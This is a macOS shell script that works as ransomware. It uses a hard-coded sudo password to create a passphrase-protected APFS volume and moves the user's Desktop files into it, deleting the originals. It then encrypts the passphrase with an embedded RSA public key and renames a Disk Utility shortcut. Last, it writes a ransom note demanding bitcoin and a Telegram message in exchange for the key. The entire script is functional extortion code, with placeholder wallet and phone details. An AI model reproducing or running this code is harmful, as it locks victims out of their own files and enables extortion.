userP="12345"
idUser=$(echo $(id -u):$(id -g));
echo $idUser
diskP=$(openssl rand -hex 63);
echo $userP | sudo -S diskutil ap addvolume disk1 apfs OhNoItIsLocked -passphrase "$diskP";
echo $userP | sudo -Srsync -zvh -r --remove-source-files --prune-empty-dirs ~/Desktop /Volumes/OhNoItIsLocked;
echo $userP | sudo -Schown -R $idUser /Volumes/OhNoItIsLocked;
echo $userP | sudo -Sdiskutil umount OhNoItIsLocked;
cd ~/Desktop;
base64 --decode <<< "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF2bFFqa01tM0pVZC8xTW1GRm9mUwpRbXdTMFVvaHVQYXZHdVNocThNRHQ4d0xhR2dRNXY5N3BOOElWQ09DY0x3YzZxdEl3RU51eCtMdmdVMUxWQWVSCkN6bFBOaVFjaDhETHpSQVk2ektFUU1paThENVVack5JMzVwdm9nMWJRUmpoVlZ1TUFuQ0NOeU5Gd2tFKzdxc0kKOU9PblplSFZFOTBVYmtzMkVWQ0NqYXVhcVRGNXZYd1RqcTA5VTNGVVJ1UmlVZEg1RUVkV2gzbkNNMEJObUlQUgpsRC9QSnRreUFsenlCbVRTbTljcUlZVmhld1Z0NXN0OVlhMkxnNmZSbVNjL01zV29JOHU5MkdUTkhNU1FuTDBWCi9YdHhaY3FMVkZSNTd1clV2ZmZna0FqVThaV0JSbDRRUFhCc3BLZ1pSTklmUnlhSmlFWDJJMjg5YWlmVEFGUlgKUXdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==" > pubK.pem;
echo $diskP | openssl rsautl -encrypt -pubin -inkey pubK.pem > password.encrypted;
ln -s "/System/Applications/Utilities/Disk Utility.app" ~/Desktop;
echo $userP | sudo -Smv Disk\ Utility.app SeeYourFiles.app;
echo 'If you can read this message, it means you have been badly hacked. Indeed, You might have seen that all of your precious files are gone. But be reassured, they are not really gone, at least for now. If you open the App "SeeYourFiles" from your Desktop, you might see a new unmounted drive called "OhNoItIsLocked". This is the drive that contains your data. You can try to open by right-clicking on it and clicking on "mount" but, as you may see, this drive is encrypted and I am the only person who can get the key back, but not without a bit of teamwork with you.\n\nOn your Desktop stands a file called password.encrypted. With this file, I could easily get the password of your drive to help you unlock it. Sadly, I cannot work for free...\n\nIn short, send 0,000028 btc to this wallet (0x01234567890123456789) with and send a telegram message to this number (0123456789) with a picture of the transaction and the file "password.encrypted" attached. I will then send you the key to your files.\n\nIt is a pleasure to work with you.\n\nKind regards\n\nMightyGoose' > READ_ME_IF_YOU_WANT_YOUR_FILES_BACK.txt;
rm pubK.pem;
